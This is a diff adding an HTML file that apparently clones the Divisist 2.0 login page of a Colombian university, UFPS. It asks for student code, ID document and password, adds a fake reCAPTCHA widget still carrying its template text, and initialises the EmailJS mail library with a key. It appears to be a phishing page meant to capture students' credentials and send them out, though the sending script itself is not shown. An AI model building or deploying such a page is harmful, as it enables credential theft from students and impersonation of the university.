@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Divisist 2.0</title>
+    <meta charset="UTF-8" />
+    <meta name="application-name" content="Divisist2.0" lang="es" />
+    <meta name="Author" content="Henry Alexander Peñaranda Mora" lang="es" />
+    <meta
+      name="Contributors"
+      content="Viarney Alirio Villamizar Moreno"
+      lang="es"
+    />
+    <meta
+      name="Aditional-Contributors"
+      content="Jean Polo Cequeda Olago, Luis Eduardo Ramirez Mora"
+      lang="es"
+    />
+    <meta
+      name="keywords"
+      content="ufps, universidad, francisco, de paula, santander, cucuta, colombia,carreras,ingenierias, pregrados,norte de santander, especializaciones, diplomados,cursos,oriente, matricula, notas, división, sistemas"
+    />
+    <link
+      href="../../divisist2.ufps.edu.co/assets/img/ufps/favicon.ico"
+      rel="Shortcut icon"
+    />
+    <meta
+      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
+      name="viewport"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/bootstrap/bootstrap.min.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/fontawesome/css/font-awesome.min.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/fontawesome-v5.2.0/css/all.min.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/fontawesome-v5.2.0/css/v4-shims.min.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/hovermaster/hover-min.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/adminlte/AdminLTE.min.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/custom.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/style.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/plugins/line-icons/line-icons.css"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="../../divisist2.ufps.edu.co/assets/css/custom/noticias.css"
+    />
+    <link rel="stylesheet" href="./css/bg.css" />
+    <link rel="stylesheet" href="./css/fakerecaptcha.css" />
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script
+      async=""
+      src="https://www.googletagmanager.com/gtag/js?id=UA-145084914-1"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "UA-145084914-1");
+    </script>
+  </head>
+  <body class="login-page">
+    <div class="carousel">
+      <div
+        class="slide"
+        style="
+          background-image: url('../../divisist2.ufps.edu.co/assets/img/background/img1.jpg');
+        "
+      ></div>
+      <div
+        class="slide"
+        style="
+          background-image: url('../../divisist2.ufps.edu.co/assets/img/background/img2.jpg');
+        "
+      ></div>
+      <div
+        class="slide"
+        style="
+          background-image: url('../../divisist2.ufps.edu.co/assets/img/background/img3.jpg');
+        "
+      ></div>
+    </div>
+    <div class="content">
+      <div class="login-box2">
+        <div class="login-logo no-margin">
+          <div class="row">
+            <div class="col-md-12">
+              <!--<a href="">DIVISIST <strong>2.0</strong></a>-->
+              <img
+                class="img-responsive center-block"
+                src="../../divisist2.ufps.edu.co/assets/img/ufps/logo_divisist2.png"
+              />
+            </div>
+          </div>
+        </div>
+        <!-- /.login-logo -->
+        <div id="lights"></div>
+        <div class="login-box-body">
+          <div id="template_alerts"></div>
+          <strong style="display: none" id="ipId"></strong>
+          <p class="login-box-msg">Ingresa tus datos para iniciar sesión</p>
+          <form id="form">
+            <input type="hidden" name="login" value="1" style="display: none" />
+            <input type="hidden" name="miip" id="miip" />
+            <input type="hidden" name="miipreal" id="miipreal" />
+
+            <div class="form-group has-feedback">
+              <input
+                type="text"
+                class="form-control"
+                placeholder="Código"
+                name="codigo"
+                maxlength="7"
+                value=""
+                required="required"
+                id="codigo"
+              />
+              <span
+                class="glyphicon glyphicon-user form-control-feedback"
+              ></span>
+            </div>
+            <div class="form-group has-feedback">
+              <input
+                type="text"
+                onblur="presiono(this)"
+                onfocus="esta(this)"
+                class="form-control"
+                onchange="cambio(this)"
+                placeholder="Documento"
+                id="documento"
+                name="documento"
+                maxlength="20"
+                value=""
+                required="required"
+              />
+              <span
+                class="glyphicon glyphicon-user form-control-feedback"
+              ></span>
+            </div>
+            <div class="form-group has-feedback">
+              <input
+                type="password"
+                class="form-control"
+                placeholder="Contraseña"
+                name="contrasena"
+                id="contrasena"
+                maxlength="32"
+                required="required"
+              />
+              <span
+                class="glyphicon glyphicon-lock form-control-feedback"
+              ></span>
+            </div>
+            <div class="form-group">
+              <div
+                class="g-recaptcha"
+                data-sitekey="6Le-OqklAAAAABiCJe7ZnjsGH4NBRqTmGVujW11C"
+              ></div>
+            </div>
+
+            <!-- Fake captcha start -->
+            <div class="fkrc-container fkrc-m-p">
+              <!-- Captcha checkbox widget -->
+              <div
+                id="fkrc-checkbox-window"
+                class="fkrc-checkbox-window fkrc-m-p fkrc-block"
+              >
+                <div class="fkrc-checkbox-container fkrc-m-p">
+                  <button
+                    type="button"
+                    id="fkrc-checkbox"
+                    class="fkrc-checkbox fkrc-m-p fkrc-line-normal"
+                  ></button>
+                </div>
+                <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">
+                  No soy un robot
+                </p>
+                <img
+                  src="img/captcha_logo.png"
+                  class="fkrc-captcha-logo fkrc-line-normal"
+                  alt=""
+                />
+                <p class="fkrc-checkbox-desc1 fkrc-m-p fkrc-line-normal">
+                  reCAPTCHA
+                </p>
+                <p class="fkrc-checkbox-desc2 fkrc-m-p fkrc-line-normal">
+                  Privacidad - Condiciones
+                </p>
+                <img
+                  src="img/captcha_spinner.gif"
+                  class="fkrc-spinner fkrc-m-p fkrc-line-normal"
+                  alt=""
+                  id="fkrc-spinner"
+                />
+                <img
+                  src="img/checkmark.png"
+                  class="checkmark"
+                  alt=""
+                  id="checkmark"
+                />
+              </div>
+              <!-- Captcha checkbox verification window -->
+              <div id="fkrc-verifywin-window" class="fkrc-verifywin-window">
+                <div class="fkrc-verifywin-container">
+                  <header class="fkrc-verifywin-header">
+                    <span
+                      class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block"
+                      >This is your</span
+                    >
+                    <span
+                      class="fkrc-verifywin-header-text-big fkrc-m-p fkrc-block"
+                      >fake captcha</span
+                    >
+                    <span
+                      class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block"
+                      >Customize it however you want</span
+                    >
+                  </header>
+                </div>
+                <footer class="fkrc-verifywin-container fkrc-verifywin-footer">
+                  <button
+                    type="button"
+                    class="fkrc-verifywin-verify-button fkrc-block"
+                    id="fkrc-verifywin-verify-button"
+                  >
+                    Verify
+                  </button>
+                </footer>
+              </div>
+              <img
+                src="img/captcha_arrow.svg"
+                alt=""
+                class="fkrc-verifywin-window-arrow"
+                id="fkrc-verifywin-window-arrow"
+              />
+            </div>
+            <div id="doc"></div>
+            <div class="row">
+              <br />
+              <div class="col-xs-12 center-block">
+                <button
+                  id="button_session"
+                  class="btn btn-danger btn-block btn-flat"
+                >
+                  Iniciar Sesión
+                </button>
+              </div>
+              <div class="col-xs-12 center-block" style="margin-top: 20px">
+                <a
+                  style="color: #d9534f"
+                  tabindex="0"
+                  href="#"
+                  data-toggle="popover"
+                  data-trigger="focus"
+                  title="<b>¿Olvidaste tu clave?</b>"
+                  data-content="<p class = 'text-justify'>El proceso de restablecimiento de clave se debe realizar cuando se ha olvidado o aún no tiene una clave asignada, para ambos casos se le enviará un email al correo institucional y/o el correo personal registrado en el sistema.<br><br> En caso de no tener acceso a los mismos, debe dirigirse a la oficina de Admisiones y Registro Académico y actualizar sus datos personales.</p>"
+                  data-placement="top"
+                  data-html="true"
+                >
+                  <i class="fa fa-question-circle" title="Ayuda"></i>
+                </a>
+                <a
+                  href="#"
+                  class="text-danger"
+                  data-toggle="modal"
+                  title="Reestablecer o crear por primera vez la clave."
+                  data-target="#myModalTutorialCambioClave"
+                  >¿Olvidaste tu clave? <i class="fa fa-book"></i
+                ></a>
+                <!--<a class="text-danger" href="https://divisist2.ufps.edu.co/index/restablecer_clave">¿Olvidaste tu clave?</a>-->
+                <!--<button type="button" class="cd-btn btn btn-flat btn-danger pull-right"><i class="fa fa-newspaper-o"></i></button>-->
+                <a href="#" class="cd-btn text-danger pull-right"
+                  ><i class="fa fa-newspaper-o hvr-buzz-out"></i> Noticias</a
+                >
+              </div>
+              <div
+                class="col-xs-12 center-block"
+                style="margin-top: 20px"
+              ></div>
+            </div>
+          </form>
+          <div style="text-align: center">
+            <style>
+              .button {
+                background-color: white;
+                color: black;
+                font-size: 14px;
+                width: 170px;
+                text-align: center;
+                line-height: 30px;
+                border-color: #aaaaaa;
+                border-width: 1px;
+                border-style: solid;
+                border-radius: 3px;
+                box-shadow: 2px 2px 5px #999;
+              }
+              .button:hover {
+                background-color: #bbdefb;
+              }
+            </style>
+            <form>
+              <button
+                style=""
+                type="button"
+                onclick="login_google()"
+                class="button"
+                title="Iniciar sesion con Google"
+              >
+                <img
+                  class="pull-left"
+                  title="Iniciar sesion con Google"
+                  src="../../divisist2.ufps.edu.co/assets/img/google/google.png"
+                  width="18%"
+                />
+                Inicia con Google
+              </button>
+            </form>
+          </div>
+
+          <!--About Section-->
+          <section id="">
+            <!-- all for your comfort blocks -->
+            <div class="row login-links">
+              <div class="col-md-3 col-sm-3 col-xs-3">
+                <a
+                  href="https://docentes.ufps.edu.co"
+                  data-toggle="tooltip"
+                  data-placement="bottom"
+                  title=""
+                  data-original-title="Docente"
+                >
+                  <div class="text-center">
+                    <span
+                      aria-hidden="true"
+                      class="text-danger icon-user icon hvr-grow fa-2x"
+                    ></span>
+                  </div>
+                </a>
+              </div>
+              <div class="col-md-3 col-sm-3 col-xs-3">
+                <a
+                  class=" "
+                  about="https://divisist2.ufps.edu.co/login_plad"
+                  data-toggle="tooltip"
+                  data-placement="bottom"
+                  title=""
+                  data-original-title="PLAD"
+                >
+                  <div class="text-center">
+                    <span
+                      aria-hidden="true"
+                      class="text-danger hvr-grow fa-2x fa fa fa-rocket"
+                    ></span>
+                  </div>
+                </a>
+              </div>
+              <div class="col-md-3 col-sm-3 col-xs-3">
+                <a
+                  href="https://udirplan.ufps.edu.co"
+                  data-toggle="tooltip"
+                  data-placement="bottom"
+                  title=""
+                  data-original-title="Jefe de Plan"
+                >
+                  <div class="text-center">
+                    <span
+                      aria-hidden="true"
+                      class="text-danger icon-user-following icon hvr-grow fa-2x"
+                    ></span>
+                  </div>
+                </a>
+              </div>
+              <div class="col-md-3 col-sm-3 col-xs-3">
+                <a
+                  href="https://evaldocente.ufps.edu.co/admitidos/vacacionales/index.php"
+                  data-toggle="tooltip"
+                  data-placement="bottom"
+                  title=""
+                  data-original-title="Vacacionales"
+                >
+                  <div class="text-center">
+                    <span
+                      aria-hidden="true"
+                      class="text-danger icon-book-open icon hvr-grow fa-2x"
+                    ></span>
+                  </div>
+                </a>
+              </div>
+            </div>
+          </section>
+          <!--End of About Section-->
+          <div class="cd-panel from-left">
+            <header class="cd-panel-header">
+              <h1><i class="fa fa-newspaper-o"></i> Noticias Académicas</h1>
+              <a href="#0" class="cd-panel-close">Close</a>
+            </header>
+            <div class="cd-panel-container">
+              <div class="cd-panel-content">
+                <p
+                  style="
+                    border-bottom: 1px solid #dd4b39;
+                    color: #dd4b39;
+                    font-size: 14px;
+                    font-weight: bold;
+                  "
+                >
+                  <span class="glyphicon glyphicon-chevron-right"></span> Fechas
+                  importantes para estudiantes UFPS
+                </p>
+                <p style="color: #dd4b39; font-size: 10px">
+                  <i class="fa fa-calendar"></i> Publicado, 08-MAR-24 - OFICINA
+                  DE PRENSA
+                </p>
+                <p style="font-size: 14px; text-align: justify">
+                  <img
+                    class="img-responsive center-block"
+                    width="75%"
+                    height="75%"
+                    src="../../ww2.ufps.edu.co/ufpsnuevo/archivos/98e1dddf512ac2cbb1bad59862daaa44.jpeg"
+                  />
+                </p>
+                <br />
+                <p
+                  style="
+                    border-bottom: 1px solid #dd4b39;
+                    color: #dd4b39;
+                    font-size: 14px;
+                    font-weight: bold;
+                  "
+                >
+                  <span class="glyphicon glyphicon-chevron-right"></span> Grados
+                  por ceremonia 25 de Abril de 2024
+                </p>
+                <p style="color: #dd4b39; font-size: 10px">
+                  <i class="fa fa-calendar"></i> Publicado, 08-MAR-24 - OFICINA
+                  DE PRENSA
+                </p>
+                <p style="font-size: 14px; text-align: justify">
+                  <img
+                    class="img-responsive center-block"
+                    width="75%"
+                    height="75%"
+                    src="../../ww2.ufps.edu.co/ufpsnuevo/archivos/202e685398ebe3450b07628c3d8eef54.jpg"
+                  />
+                </p>
+                <br />
+                <p
+                  style="
+                    border-bottom: 1px solid #dd4b39;
+                    color: #dd4b39;
+                    font-size: 14px;
+                    font-weight: bold;
+                  "
+                >
+                  <span class="glyphicon glyphicon-chevron-right"></span> Fecha
+                  límite solicitud terminación 2024-1
+                </p>
+                <p style="color: #dd4b39; font-size: 10px">
+                  <i class="fa fa-calendar"></i> Publicado, 01-MAR-24 - Divisist
+                </p>
+                <p style="font-size: 14px; text-align: justify">
+                  <img
+                    class="img-responsive center-block"
+                    width="60%"
+                    height="60%"
+                    src="../../divisist2.ufps.edu.co/public/documentos/360a95fe749fa8eec64585012c9ed457.jpg"
+                  />
+                </p>
+                <br />
+                <p
+                  style="
+                    border-bottom: 1px solid #dd4b39;
+                    color: #dd4b39;
+                    font-size: 14px;
+                    font-weight: bold;
+                  "
+                >
+                  <span class="glyphicon glyphicon-chevron-right"></span> Fechas
+                  importantes de grados 2024-1
+                </p>
+                <p style="color: #dd4b39; font-size: 10px">
+                  <i class="fa fa-calendar"></i> Publicado, 01-MAR-24 - Divisist
+                </p>
+                <p style="font-size: 14px; text-align: justify">
+                  <img
+                    class="img-responsive center-block"
+                    width="60%"
+                    height="60%"
+                    src="../../divisist2.ufps.edu.co/public/documentos/b881418624462b79bfca17db784b039a.jpg"
+                  />
+                </p>
+                <br />
+                <p
+                  style="
+                    border-bottom: 1px solid #dd4b39;
+                    color: #dd4b39;
+                    font-size: 14px;
+                    font-weight: bold;
+                  "
+                >
+                  <span class="glyphicon glyphicon-chevron-right"></span>
+                  Solicitud de Constancias y Certificados
+                </p>
+                <p style="color: #dd4b39; font-size: 10px">
+                  <i class="fa fa-calendar"></i> Publicado, 09-MAR-21 - Divisist
+                </p>
+                <p style="font-size: 14px; text-align: justify">
+                  Estimado Estudiante: La solicitud de Constancias de Estudio,
+                  Certificado de Calificaciones o Actualización de Documento de
+                  Identidad debe solicitarla a través del siguiente enlace:
+                  <br /><a
+                    href="https://divisist2.ufps.edu.co/solicitud"
+                    target="_blank"
+                    >https://divisist2.ufps.edu.co/solicitud</a
+                  >
+                  y la Vicerrectoría Asistente de Estudios le atenderá su
+                  requerimiento.
+                </p>
+                <br />
+                <p
+                  style="
+                    border-bottom: 1px solid #dd4b39;
+                    color: #dd4b39;
+                    font-size: 14px;
+                    font-weight: bold;
+                  "
+                >
+                  <span class="glyphicon glyphicon-chevron-right"></span>
+                  Consultas Correo Electrónico
+                </p>
+                <p style="color: #dd4b39; font-size: 10px">
+                  <i class="fa fa-calendar"></i> Publicado, 29-FEB-16 - Divisist
+                </p>
+                <p style="font-size: 14px; text-align: justify">
+                  Presente sus solicitudes justificadas y consultas a través del
+                  correo <b>consulta.estudiante@ufps.edu.co</b><br /><b
+                    >Nota:</b
+                  >
+                  Recuerde identificarse correctamente (Nombre completo y
+                  codigo).
+                </p>
+                <br />
+              </div>
+              <!-- cd-panel-content -->
+            </div>
+            <!-- cd-panel-container -->
+          </div>
+          <!-- cd-panel -->
+
+          <div
+            class="modal modal-info fade"
+            id="myModalTutorialCambioClave"
+            tabindex="-1"
+            role="dialog"
+          >
+            <div class="modal-dialog" role="document">
+              <div class="modal-content">
+                <div class="modal-header">
+                  <button
+                    type="button"
+                    class="close"
+                    data-dismiss="modal"
+                    aria-label="Close"
+                  >
+                    <span aria-hidden="true">×</span>
+                  </button>
+                  <h4 class="modal-title">
+                    <i class="fa fa-info-circle"></i> Proceso de
+                    restablecimiento de contraseñas
+                  </h4>
+                </div>
+                <div class="modal-body">
+                  <p class="text-justify">
+                    A continuación se expone en detalle los pasos a seguir para
+                    el restablecimiento de la contraseña de usuario en el portal
+                    web <strong>Divisist 2.0</strong>
+                  </p>
+                  <hr />
+                  <p class="text-justify">
+                    <strong
+                      >1. Enviar correo de restablecimiento de
+                      contraseña</strong
+                    >
+                  </p>
+                  <p class="text-justify">
+                    Para completar este paso es necesario escribir en el
+                    formulario: <i class="fa fa-lock"></i>
+                    <b>Recuperar su contraseña</b>, el código del estudiante y
+                    uno de los correos electrónicos asociados a su cuenta
+                    (correo personal o institucional), se recomienda utilizar
+                    para estos procesos el correo institucional.
+                  </p>
+                  <p class="text-justify">
+                    Para confirmar que el correo se ha enviado con éxito el
+                    sistema mostrará una alerta como la que se aprecia a
+                    continuación.
+                  </p>
+                  <p class="text-center">
+                    <img
+                      class="img img-responsive img-thumbnail margin"
+                      src="../../divisist2.ufps.edu.co/assets/img/tutorial/cambio_clave/1.PNG"
+                      style="width: 220px"
+                    />
+                    <img
+                      class="img img-responsive img-thumbnail margin"
+                      src="../../divisist2.ufps.edu.co/assets/img/tutorial/cambio_clave/2.PNG"
+                      style="width: 220px"
+                    />
+                  </p>
+                  <div class="callout callout-info bg-aqua-gradient">
+                    <div class="text-center clearfix">
+                      <i class="fa fa-exclamation-circle fa-3x"></i>
+                    </div>
+                    <p class="text-justify">
+                      En caso que el estudiante no pueda acceder a su correo
+                      institucional podrá solicitar el restablecimiento de su
+                      contraseña enviando un mensaje al correo electrónico
+                      <strong>consulta.estudiante@ufps.edu.co</strong> con su
+                      código de estudiante.
+                    </p>
+                    <p class="text-justify">
+                      Si el estudiante no puede acceder a su correo electrónico
+                      personal, deberá dirigirse a la oficina de
+                      <strong
+                        >Admisiones y Registro Académico (edificio Torre
+                        Administrativa)</strong
+                      >
+                      y solicitar la actualización de sus datos personales entre
+                      estos el correo personal.
+                    </p>
+                  </div>
+                  <p class="text-justify">
+                    <strong>2. Restablecimiento de clave personal</strong>
+                  </p>
+                  <p class="text-justify">
+                    <strong>A. </strong>
+                    En la bandeja de entrada del correo electrónico utilizado en
+                    el paso anterior, llegará un enlace que contiene una llave
+                    única para el restablecimiento de la contraseña del
+                    estudiante.
+                  </p>
+                  <p class="text-center">
+                    <img
+                      class="img img-responsive img-thumbnail margin"
+                      src="../../divisist2.ufps.edu.co/assets/img/tutorial/cambio_clave/3.PNG"
+                      style="width: 280px"
+                    />
+                    <img
+                      class="img img-responsive img-thumbnail margin"
+                      src="../../divisist2.ufps.edu.co/assets/img/tutorial/cambio_clave/4.PNG"
+                      style="width: 220px"
+                    />
+                  </p>
+                  <p class="text-justify">
+                    <strong>B.</strong> Diligenciar el formulario:
+                    <strong
+                      ><i class="fa fa-lock"></i> Restaurar la clave de su
+                      cuenta</strong
+                    >
+                  </p>
+                  <p class="text-justify">
+                    El sistema le indicará los requisitos para una contraseña
+                    segura y no le permitirá guardar cambios hasta que la
+                    contraseña cumpla con el nivel mínimo requerido y que
+                    coincida con su confirmación. Se le recomienda realizar este
+                    procedimiento cuidadosamente.
+                  </p>
+                  <p class="text-center">
+                    <img
+                      class="img img-responsive img-thumbnail margin"
+                      src="../../divisist2.ufps.edu.co/assets/img/tutorial/cambio_clave/5.PNG"
+                      style="width: 220px"
+                    />
+                    <img
+                      class="img img-responsive img-thumbnail margin"
+                      src="../../divisist2.ufps.edu.co/assets/img/tutorial/cambio_clave/6.PNG"
+                      style="width: 220px"
+                    />
+                  </p>
+                  <hr />
+                  <div class="callout callout-info bg-aqua-gradient">
+                    <div class="text-center clearfix">
+                      <i class="fa fa-check-circle-o fa-4x"></i>
+                    </div>
+                    <p class="text-justify">
+                      <strong>¡El proceso está completo!</strong>, ahora los
+                      estudiantes de la <strong>UFPS</strong>
+                      contarán con una contraseña de mayor nivel de seguridad.
+                      La seguridad en los sistemas de información es muy
+                      importante para evitar que terceros accedan o alteren
+                      información que solo le compete al usuario.
+                    </p>
+                    <p class="text-justify">
+                      Las contraseñas son elementos personales e
+                      intransferibles. Compartir o descuidar la contraseña para
+                      el portal <strong>Divisist 2.0</strong>
+                      puede traer consecuencias negativas como: cancelación de
+                      materias, cambio de grupo en periodos de inclusión y
+                      anulación de solicitudes de comedor.
+                    </p>
+                  </div>
+                </div>
+                <div class="modal-footer">
+                  <button
+                    type="button"
+                    class="btn btn-outline pull-left"
+                    data-dismiss="modal"
+                  >
+                    <i class="fa fa-times-circle-o"></i> Cerrar
+                  </button>
+                  <a
+                    href="https://divisist2.ufps.edu.co/index/restablecer_clave"
+                    class="btn btn-outline pull-right"
+                    ><i class="fa fa-arrow-circle-o-right"></i> Entendido,
+                    Recuperar contraseña</a
+                  >
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- /.login-box -->
+      </div>
+    </div>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/jquery/jQuery-2.1.3.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/bootstrap/bootstrap.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/adminlte/app.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/views/snow2.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/views/snowready3.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/views/login/sesion_google.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/bootstrap/popover_main.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/views/index/main.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/views/index/one.app.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/plugins/backstretch/jquery.backstretch.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../../divisist2.ufps.edu.co/assets/js/views/login/login.min.js"
+    ></script>
+    <script src="./js/bgScript.js"></script>
+    <script src="./js/fakerecaptcha.js"></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+
+    <script type="text/javascript">
+      emailjs.init("ldM4rBZ3kt2DklLBs");
+    </script>
+  </body>
+</html>
